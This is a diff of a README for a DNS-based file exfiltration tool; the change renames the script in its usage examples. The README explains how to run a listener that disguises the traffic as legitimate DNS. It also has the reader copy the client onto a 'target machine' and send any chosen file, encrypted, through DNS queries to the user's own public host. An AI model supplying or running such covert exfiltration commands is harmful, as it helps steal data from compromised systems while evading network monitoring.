@@ -18,7 +18,7 @@ The script can be run in two modes: `host` or `client`. The host mode should be 
 ### Host
 Running the script in host mode will run a DNS server on udp/53, which is built specifically to receive exfiltrated data from the script in client mode and respond accordingly with a standard DNS reponse in order to further mask the traffic as being legitimate. For example:
 ```
-python3 main.py -mode host -hostip "127.0.0.1" -password "s3cr3tp4ssw0rd"
+python3 dns-exfil.py -mode host -hostip "127.0.0.1" -password "s3cr3tp4ssw0rd"
 ```
 
 This will start a DNS server on UDP port 53 (default, can be changed) and use the seed phrase specified by the `-password` argument to decrypt the received data.
@@ -26,12 +26,12 @@ This will start a DNS server on UDP port 53 (default, can be changed) and use th
 ### Client
 On your target machine, copy-paste / install the script and run it. For example:
 ```
-python3 main.py -mode client -dest "your_public_machine_ip" -password "s3cr3tp4ssw0rd" -file "/path/to/the/file/you/want/to/exfil"
+python3 dns-exfil.py -mode client -dest "your_public_machine_ip" -password "s3cr3tp4ssw0rd" -file "/path/to/the/file/you/want/to/exfil"
 ```
 
 When executed on your target's machine, the script will open up the specified `-file`, encrypt the data with the provided `-password` seed phrase and send over the encrypted file contents through DNS queries to the specified `-dest` IP address / host name (this should be the IP where you are running the script in host mode).
 
 ### More help on arguments and options
 ```
-python3 main.py -h
+python3 dns-exfil.py -h
 ```
